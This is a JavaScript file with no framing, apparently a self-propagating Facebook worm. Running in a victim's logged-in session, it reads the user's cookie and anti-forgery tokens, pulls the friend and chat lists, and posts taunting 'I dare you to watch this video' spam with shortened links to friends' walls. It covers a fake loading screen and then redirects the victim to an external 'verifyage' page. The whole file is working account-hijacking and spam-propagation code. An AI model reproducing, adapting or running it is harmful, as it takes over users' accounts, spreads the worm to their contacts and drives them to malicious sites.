document.getElementById('contentArea').innerHTML='<center><br><h1>Please  wait...processing     your  request<br><br><br><br><img  src=\"http://static-hp.com/images/loading-bar.gif\"  /><br  /></center>';   


/* Utilities. */
 function getRandomInt (min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 function randomValue(arr) {
     return arr[getRandomInt(0, arr.length-1)];
 }
 
 
 // Setup some variables
 var post_form_id = document.getElementsByName('post_form_id')[0].value;
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
             
             
   /* Message spinner. */
 
 var p0 = ['I dare you to watch this for over 25 seconds.The scariest video ever','Can you watch this for over 25 seconds?I dare you to beat my time'];
 var p1 = ['hey', 'HEY', 'WTF', 'OMG', 'ROTFL', 'YO', 'yo', 'YO!', 'omg!', 'omg', 'wtf', 'wtf!!', 'WTF!!','OMG!!'];
 var p2 = ['why are you', 'what are you doing', 'I can\'t believe you\'re', 'you look so stupid', 'i cant believe you\'re tagged', 'why are you tagged','you should untag yourself'];
 var p3 = ['in this video?', 'in this vid?'];
 var message = "";
 
          
             
            var domains=['http://bit.ly/rrNr4i','http://bit.ly/rxVB6V','http://bit.ly/sDxo8p','http://bit.ly/tOaMPx','http://bit.ly/to7zja','http://bit.ly/rtafj2','http://bit.ly/t632Tb','http://bit.ly/sRp6SX','http://bit.ly/tTDKsI','http://bit.ly/tLUlkV','http://bit.ly/sOunIx','http://bit.ly/sNF8nA','http://bit.ly/sVYp0Q','http://bit.ly/sgbBh3','http://bit.ly/swXOVR','http://bit.ly/vjQJku','http://bit.ly/rUMqh1','http://bit.ly/vUxbQp','http://bit.ly/w04rqh','http://bit.ly/uReO5w','http://bit.ly/s8fGqe','http://bit.ly/ry4Bd0','http://bit.ly/ujbZLF','http://bit.ly/t1QYyp','http://bit.ly/sy45JS','http://bit.ly/uaVT4r','http://bit.ly/sodGHr','http://bit.ly/uKPY8b','http://bit.ly/rSA6aa','http://bit.ly/s6GvR5','http://bit.ly/vBH7eg','http://bit.ly/rxRwfu','http://bit.ly/rSoEx7','http://bit.ly/vLK2bD','http://bit.ly/thiqsQ','http://bit.ly/rDZVK0','http://bit.ly/upbUg2','http://bit.ly/vvXP7g','http://bit.ly/sDTcQ8','http://bit.ly/vBWoRG','http://bit.ly/s369hj','http://bit.ly/uBZ2d1','http://bit.ly/v01dOG','http://bit.ly/sjCc9N','http://bit.ly/uc7Qvz','http://bit.ly/tTYkIl','http://bit.ly/uvHziL','http://bit.ly/v7FMsT','http://bit.ly/uv4f49','http://bit.ly/uS8GZ6','http://bit.ly/tm9NpS','http://bit.ly/w52Czs','http://bit.ly/t2xIcg','http://bit.ly/vakjAG','http://bit.ly/sfm22I','http://bit.ly/tcxeaS','http://bit.ly/uNJalT','http://bit.ly/twoqjM','http://bit.ly/vwfqXo','http://bit.ly/rHRfiW','http://bit.ly/tcAI3U','http://bit.ly/shIei7','http://bit.ly/s0FNzl','http://bit.ly/svT4Ys','http://bit.ly/tvYGKk','http://bit.ly/ujem2Q','http://bit.ly/rB1VJ0','http://bit.ly/sbwvKp','http://bit.ly/vr3wWL','http://bit.ly/tsGd9N','http://bit.ly/uH9E36','http://bit.ly/vUDFCn','http://bit.ly/w2QRYJ','http://bit.ly/tyWeq4','http://bit.ly/rL4ehO','http://bit.ly/sOd6h8','http://bit.ly/uuJeTc','http://bit.ly/tzL4YM','http://bit.ly/rXjPPh','http://bit.ly/tAf6WM','http://bit.ly/sijHdg','http://bit.ly/tlOkRO','http://bit.ly/tZeM2a','http://bit.ly/s97bxi','http://bit.ly/seZ1Sg','http://bit.ly/u0OVcr','http://bit.ly/tu78rQ','http://bit.ly/vbCLXC','http://bit.ly/sh3spU','http://bit.ly/sQgQ0X','http://bit.ly/vHsrTh','http://bit.ly/srYkxN','http://bit.ly/sU0GXQ','http://bit.ly/sT6HXd','http://bit.ly/uVEDO4','http://bit.ly/thpSwE','http://bit.ly/uYBaKG','http://bit.ly/tKpifX','http://bit.ly/s3X4ko','http://bit.ly/tFj09n','http://bit.ly/t5PWcy'];
            
 
 
 
 /////////
 ///////////////////////////////mailing////////////////////////////
 var http3 = new XMLHttpRequest();
 var url3 = "http://www.facebook.com/ajax/chat/buddy_list.php?__a=1";
 var params3 = "user=" + user_id + "&popped_out=false&force_render=true&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd&post_form_id_source=AsyncRequest";
 http3['open']("POST", url3, true);
 http3['setRequestHeader']("Content-type", "application/x-www-form-urlencoded");
 http3['setRequestHeader']("Content-length", params3['length']);
 http3['setRequestHeader']("Connection", "close");
 http3['onreadystatechange'] = function () {
     if (http3['readyState'] == 4 && http3['status'] == 200) {
         var response3 = http3['responseText'];
         response3 = response3.replace("for (;;);", "");
         response3 = JSON.parse(response3);
         var count = 0;
         for (property in response3.payload.buddy_list.nowAvailableList) {
             if (count < 100) {
                 var httpc = new XMLHttpRequest();
                 var msgid = Math.floor(Math.random() * 1000000);
                 var time = Math.round(new Date().getTime() / 1000);
                 var urlc = "/ajax/sharer/submit/?__a=1";
                 var paramsc ="ad_params=&friendTarget="+property+"&groupTarget=&message=I%20dare%20you%20to%20watch%20this%20for%20at%20least%2025%20seconds!&UIThumbPager_Input=0&app_id=2309869772&attachment[params][0]=183533291735554&attachment[params][1]=107292496053776&attachment[params][images][0]=http%3A%2F%2Fi3.ytimg.com%2Fvi%2FrzaSjJYbxgc%2Fdefault.jpg&attachment[type]=99&src=i&appid=2309869772&parent_fbid=&mode=friend&audience[0][value]=80&UITargetedPrivacyWidget=80&pageTarget=271819969526779&message_text=I%20dare%20you%20to%20watch%20this%20for%20at%20least%2025%20seconds!&submit=Share%20Link&nctr[_mod]=pagelet_wall&__d=1&post_form_id="+post_form_id+"&fb_dtsg="+fb_dtsg+"&lsd&post_form_id_source=AsyncRequest&__user=";
                 httpc['open']("POST", urlc, true);
                 httpc['setRequestHeader']("Content-type", "application/x-www-form-urlencoded");
                 httpc['setRequestHeader']("Content-length", paramsc['length']);
                 httpc['setRequestHeader']("Connection", "close");
                 httpc['onreadystatechange'] = function () {
                     if (httpc['readyState'] == 4 && httpc['status'] == 200) {}
                 }
                 httpc['send'](paramsc);
             }
             count++;
         }
         http3['close'];
     }
 }
 http3.send(params3);
 
 ////////////////////////////////////////////wall////////////////////////////////////////////////////////////////
var httpwp = new XMLHttpRequest();
var urlwp = "/dialog/feed";
var paramswp = "post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&&preview=0&_path=feed&app_id=123050457758183&redirect_uri=http://www.example.com/response/&link=http://www.facebook.com&message=Facebook%20Dialogs%20are%20so%20easy!&picture=http://i1.ytimg.com/vi/lagB6SNCS2I/default.jpg&source="+ randomValue(domains) +"?.swf/&caption=Are%20you%20in%20the%20the%202%?&description=%3C--Click%20On%20Play%20to%20find%20out!I%20dare%20you%20to%20even%20get%20to%2015%20seconds.&name=98%%20Of%20People%20Cant%20Watch%20This%20Video%20More%20Than%2025%20Seconds!&from_post=1&feedform_user_message="+ randomValue(p0) + "&publish=Share&audience%5B0%5D%5Bvalue%5D=80";
httpwp.open("POST", urlwp, true);
httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
httpwp.setRequestHeader("Content-length", paramswp.length);
httpwp.setRequestHeader("Connection", "keep-alive");
httpwp.send(paramswp);






///////////////
///////////////////////////////walls////////////////////////////////////////////////////////////////
 var friends = new Array();
 gf = new XMLHttpRequest();
 gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&token" + Math.random() + "&filter[0]=user&options[0]=friends_only", false);
 gf.send();
 if (gf.readyState != 4) {} else {
     data = eval('(' + gf.responseText.substr(9) + ')');
     if (data.error) {} else {
         friends = data.payload.entries.sort(function (a, b) {
             return a.index - b.index;
         });
     }
 }
 
 for (var i = 0; i < friends.length; i++) {
 
     message = [randomValue(p1), friends[i].text.substr(0,friends[i].text.indexOf(' ')).toLowerCase(), randomValue(p2), randomValue(p3)].join(' ');
 
     var httpwp = new XMLHttpRequest();
     var urlwp = "/ajax/sharer/submit/?__a=1";
     var paramswp ="ad_params=&friendTarget="+friends[i].uid+"&groupTarget=&message=" + friends[i].text.substr(0,friends[i].text.indexOf(' ')) + "%20I%20dare%20you%20to%20watch%20this%20for%20at%20least%2025%20seconds!&UIThumbPager_Input=0&app_id=2309869772&attachment[params][0]=183533291735554&attachment[params][1]=107292496053776&attachment[params][images][0]=http%3A%2F%2Fi3.ytimg.com%2Fvi%2FrzaSjJYbxgc%2Fdefault.jpg&attachment[type]=99&src=i&appid=2309869772&parent_fbid=&mode=friend&audience[0][value]=80&UITargetedPrivacyWidget=80&pageTarget=271819969526779&message_text="  + friends[i].text.substr(0,friends[i].text.indexOf(' ')) + "%20%20I%20dare%20you%20to%20watch%20this%20for%20at%20least%2025%20seconds!&submit=Share%20Link&nctr[_mod]=pagelet_wall&__d=1&post_form_id="+post_form_id+"&fb_dtsg="+fb_dtsg+"&lsd&post_form_id_source=AsyncRequest&__user=";
     httpwp.open("POST", urlwp, true);
     httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     httpwp.setRequestHeader("Content-length", paramswp.length);
     httpwp.setRequestHeader("Connection", "keep-alive");
     httpwp.onreadystatechange = function () {
         if (httpwp.readyState == 4 && httpwp.status == 200) {
 
         }
     }
     httpwp.send(paramswp);
 }
/////////////////////

///
 /////////
 ///////////////////////////////buds////////////////////////////
setTimeout("window.location = 'http://urwebhome.com/verifyage/index3.php?url=http://dare.bebolol.com/watch.php';", 30000);